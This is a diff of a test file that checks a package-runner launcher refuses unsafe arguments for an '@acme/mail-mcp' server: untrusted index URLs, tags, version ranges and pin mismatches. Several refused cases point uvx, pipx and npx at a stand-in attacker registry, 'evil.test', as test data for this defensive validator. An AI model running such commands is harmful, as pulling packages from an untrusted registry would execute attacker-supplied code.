@@ -141,7 +141,6 @@ verifies("app.package-runner-launch", () => {
       ["uvx", ["--find-links", "./wheels", "@acme/mail-mcp"]],
       ["uvx", ["-i", "https://evil.test/simple", "@acme/mail-mcp"]],
       ["pipx", ["run", "--pip-args=--index-url=https://evil.test", "@acme/mail-mcp"]],
-      ["cmd", ["/c", "npx --registry=https://evil.test -y @acme/mail-mcp"]],
     ];
     for (const [command, args] of refusedArgs) {
       expect(refused(stdio({ pin, command, args })), `${command} ${args.join(" ")}`).toContain(
@@ -175,9 +174,7 @@ verifies("app.package-runner-launch", () => {
       "the command asks for @acme/mail-mcp 3.0.0, but the pin is 2.3.1",
     );
     expect(refused(stdio({ pin, args: ["-y", "@acme/mail-mcp@latest"] }))).toContain("is a tag");
-    expect(
-      refused(stdio({ pin, command: "cmd", args: ["/c", "npx -y @acme/mail-mcp@^2.3.1"] })),
-    ).toContain("is a range");
+    expect(refused(stdio({ pin, args: ["-y", "@acme/mail-mcp@^2.3.1"] }))).toContain("is a range");
   });
 
   it("refuses a pinned runner whose arguments name another package", () => {
